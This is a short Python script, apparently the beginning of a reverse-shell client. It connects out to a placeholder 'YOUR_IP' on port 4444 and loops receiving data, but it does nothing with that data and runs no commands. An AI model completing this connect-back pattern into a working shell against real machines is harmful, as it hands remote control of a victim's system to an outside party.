import socket

def start():
    host = "YOUR_IP"
    port = 4444

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    while True:
        response = s.recv(4096).decode()

if __name__ == "__main__":
	start()
